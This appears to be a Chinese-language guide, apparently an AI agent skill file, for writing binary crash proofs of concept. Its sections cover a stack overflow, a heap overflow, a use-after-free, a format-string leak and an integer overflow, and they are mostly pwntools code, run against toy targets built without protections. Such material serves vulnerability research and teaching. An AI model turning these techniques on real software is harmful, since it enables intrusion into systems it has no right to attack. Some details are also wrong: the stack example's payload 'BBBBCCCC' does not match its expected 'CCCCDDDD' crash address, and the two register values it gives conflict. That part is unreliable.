---
description: Binary PoC 生成 - 从崩溃输入到稳定复现
tags: [binary, poc-generator, crash-reproduction, harness, sanitizer, fuzzing]
---

# Binary PoC 生成 (PoC Generator): 从崩溃输入到稳定复现

> Binary 的 PoC 是一个让程序崩溃的文件或数据包。
> 你的任务是：构造最小输入，让程序在精确的位置崩溃，并且每次都能复现。

## PoC 设计原则

1. **最小输入**：去掉所有无关字节，只保留触发崩溃的核心数据
2. **稳定复现**：100% 触发崩溃，不依赖随机因素
3. **崩溃位置精确**：崩溃在目标函数/指令，而非无关代码
4. **Sanitizer 友好**：开启 ASAN/UBSAN 时能被检测到

---

## PoC 一：栈溢出崩溃

### 目标
构造输入使程序在栈溢出时崩溃，覆盖返回地址为无效值。

### 环境准备

```bash
# 编译测试目标（无 Canary，方便验证）
gcc -fno-stack-protector -z execstack -no-pie -o target_stack target.c

# 目标代码示例 (target.c)
# void process(char *input) {
#     char buf[64];
#     strcpy(buf, input);
# }
```

### PoC 步骤

**Step 1：确定崩溃偏移**

```bash
# 使用 pwntools 的 cyclic 找到精确偏移
python3 -c "
from pwn import *
pattern = cyclic(200)
with open('pattern.txt', 'wb') as f:
    f.write(pattern)
"

# 运行程序并观察崩溃地址
./target_stack < pattern.txt
# Segfault at 0x6161616161616169 ('iaaaaaaa')

# 计算偏移
python3 -c "from pwn import *; print(cyclic_find(0x6161616161616169))"
# 输出: 72
```

**Step 2：构造崩溃 PoC**

```python
# crash_poc.py
from pwn import *

offset = 72
payload = b'A' * offset + b'BBBBCCCC'  # 覆盖返回地址为无效值

with open('crash_poc', 'wb') as f:
    f.write(payload)

print(f"PoC written: {len(payload)} bytes")
```

**Step 3：验证崩溃**

```bash
./target_stack < crash_poc
# 预期: Segmentation fault at 0x4343434344444444 ('CCCC' + 'DDDD')

# 使用 GDB 确认崩溃位置
pwndbg> run < crash_poc
pwndbg> info registers rip
# rip = 0x4444444443434343 ('CCCCDDDD')
```

---

## PoC 二：堆溢出崩溃（ASAN 检测）

### 目标
构造输入触发堆缓冲区溢出，被 AddressSanitizer 检测。

### 环境准备

```bash
# 编译时开启 ASAN
clang -fsanitize=address -g -o target_heap_asan target.c
```

### PoC 步骤

```python
# heap_crash_poc.py
import struct

# 假设目标程序读取：4字节长度 + 长度字节数据
# 目标代码:
# int len = read_int();
# char *buf = malloc(64);
# read(0, buf, len);

fake_len = 200  # 超过分配的 64 字节
payload = struct.pack('<I', fake_len)  # 小端序长度
payload += b'A' * fake_len

with open('heap_crash_poc', 'wb') as f:
    f.write(payload)
```

**验证**：
```bash
./target_heap_asan < heap_crash_poc
# 预期 ASAN 输出:
# ERROR: AddressSanitizer: heap-buffer-overflow
# WRITE of size 136 at 0x602000000010 thread T0
#     #0 0x555555555234 in process target.c:45
```

---

## PoC 三：Use-After-Free 崩溃

### 目标
构造触发 UAF 的输入序列。

### PoC 步骤

```python
# uaf_poc.py
# 假设目标程序提供以下交互：
# 1. alloc(size, data) -> 返回 index
# 2. free(index)
# 3. use(index) -> 使用 index 对应的指针

from pwn import *

p = process('./target_uaf')

# 分配一个 chunk
p.sendlineafter(b'choice:', b'1')  # alloc
p.sendlineafter(b'size:', b'64')
p.sendlineafter(b'data:', b'A' * 64)

# 释放它
p.sendlineafter(b'choice:', b'2')  # free
p.sendlineafter(b'index:', b'0')

# 再次使用（UAF！）
p.sendlineafter(b'choice:', b'3')  # use
p.sendlineafter(b'index:', b'0')

# 预期崩溃或 ASAN 报告 UAF
```

---

## PoC 四：格式化字符串信息泄露

### 目标
利用格式化字符串漏洞泄露栈上的地址。

### PoC 步骤

```python
# fmt_leak_poc.py
from pwn import *

p = process('./target_fmt')

# 发送格式化字符串，泄露多个栈值
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())
    leak = p.recvline().strip()
    print(f'{i:2d}: {leak.decode()}')

# 分析泄露的值:
# 0x7f... -> libc 地址
# 0x55... -> PIE/栈地址
# 0x...canary -> Stack Canary
```

---

## PoC 五：整数溢出触发崩溃

### 目标
构造输入触发整数溢出，导致后续缓冲区溢出。

### PoC 步骤

```python
# int_overflow_poc.py
import struct

# 假设目标程序:
# int count = read_int();
# int total = count * sizeof(Item);  // sizeof(Item) = 8
# Item *items = malloc(total);
# for (int i = 0; i < count; i++) read_item(&items[i]);

# 触发溢出: count = 0x20000000, total = 0x20000000 * 8 = 0 (32位溢出)
count = 0x20000000
payload = struct.pack('<I', count)
payload += b'A' * 1024  # 远超 malloc(0) 返回的小缓冲区

with open('int_overflow_poc', 'wb') as f:
    f.write(payload)
```

**验证**：
```bash
./target_int < int_overflow_poc
# 预期: Segfault 或 ASAN 报告 heap-buffer-overflow
```

---

## PoC 优化：最小化崩溃输入

### 使用 afl-tmin 最小化

```bash
# 使用 AFL 的最小化工具
afl-tmin -i crash_poc -o minimized_poc -- ./target @@

# 或使用半自动化脚本
python3 -c "
from pwn import *

with open('crash_poc', 'rb') as f:
    data = bytearray(f.read())

# 逐字节删除，检查是否仍崩溃
for i in range(len(data) - 1, -1, -1):
    test = data[:i] + data[i+1:]
    p = process('./target')
    p.send(test)
    p.wait()
    if p.poll() == -11:  # SIGSEGV
        data = test
        print(f'Removed byte {i}, still crashes. Len={len(data)}')

with open('minimized_poc', 'wb') as f:
    f.write(data)
"
```

---

## PoC 报告模板

```markdown
## PoC 报告

### 漏洞概述
[漏洞类型、位置、触发原理]

### 复现环境
- 目标: [二进制文件/服务地址]
- 编译选项: [如：-fno-stack-protector -no-pie]
- 工具: [pwndbg / ASAN / 无]

### 复现步骤
1. [步骤一]
2. [步骤二]
3. [步骤三]

### 崩溃信息
```
[ASAN 输出 / GDB backtrace / dmesg 输出]
```

### PoC 文件
- 文件名: [poc 文件名]
- 大小: [N 字节]
- 十六进制: [xxd 输出或 base64]

### Claim Chain
[从输入到崩溃的完整逻辑链]

### 无害性声明
[说明 PoC 仅导致崩溃，不执行恶意代码]

### 修复验证建议
[如何验证修复是否有效：修复后运行 PoC 不应崩溃]
```
